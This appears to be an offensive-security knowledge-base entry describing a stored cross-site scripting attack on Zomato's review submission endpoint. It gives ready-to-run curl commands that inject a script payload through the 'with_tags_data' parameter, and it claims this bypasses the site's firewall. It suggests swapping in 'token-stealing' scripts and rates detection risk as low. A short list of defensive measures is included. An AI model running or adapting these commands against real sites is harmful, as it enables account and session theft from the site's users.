---
id: proc-632017-01
tags:
  - xss
  - stored-xss
  - waf-bypass
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/submit-review-xss]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:49.973Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Submit-Review-with-Stored-XSS-Payload

## Summary

This procedure submits a restaurant review to a target site like Zomato, embedding an XSS payload in the 'with_tags_data' parameter, which bypasses WAF and stores the script for later execution during review editing.

## Description

The attack targets the review submission endpoint (POST /php/submitReview), where 'with_tags_data' is insufficiently sanitized, allowing JavaScript storage. The WAF fails to block payloads in this parameter. Prerequisites include an authenticated session with a valid CSRF token and knowledge of restaurant/city IDs. Expected outcome: Payload stored without triggering alerts, executable on edit.

## Requirements

1. Authenticated attacker account on the target site
2. Valid CSRF token from the session
3. Restaurant ID (res_id) and city ID (city_id) from target site
4. curl or similar HTTP client for POST request

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization/escaping for 'with_tags_data' (e.g., HTML entity encoding)
- Add CSRF tokens to all state-changing endpoints and validate them
- WAF rules to block <script> tags and JS in review parameters
- Monitor for anomalous review edits with JS payloads

## Objectives

1. Store arbitrary JavaScript in review data
2. Bypass WAF for payload delivery
3. Set up for later XSS execution

## Instructions

### Step 1: Prepare the XSS Payload

**Context**: Craft a simple test payload or advanced token-stealing script for 'with_tags_data'.

**Command** ([[commands/submit-review-xss]]):
```bash
# Use this as the base, replacing with_tags_data value
curl -X POST https://www.zomato.com/php/submitReview \
  -d "with_tags_data=<script>prompt(0,document.domain)</script>"
```

> This submits the review; success returns 200 with review ID. Verify by viewing the review source.

### Step 2: Submit the Full Review

**Context**: Include all required parameters to mimic legitimate submission.

**Command** ([[commands/submit-review-xss]]):
```bash
curl -X POST https://www.zomato.com/php/submitReview \
  -d "review=Sample review text here (140 chars)" \
  -d "review_db=Sample review text here (140 chars)" \
  -d "with_tags_data=<script>prompt(0,document.domain)</script>" \
  -d "res_id=19132208" \
  -d "city_id=11333" \
  -d "rating=5" \
  -d "is_edit=0" \
  -d "review_id=0" \
  -d "save_image=1" \
  -d "instagram_images_to_update=[]" \
  -d "instagram_json_data={\"data\":[]}" \
  -d "uploaded_images_json=[]" \
  -d "share_to_fb=false" \
  -d "share_to_tw=false" \
  -d "snippet=restaurant-review" \
  -d "web_source=default" \
  -d "csrf_token=YOUR_CSRF_TOKEN" \
  -d "external_url="
```

> Expected: Review created; payload stored. No JS execution yet.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/submit-review-xss]]

## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[waf-bypass]]
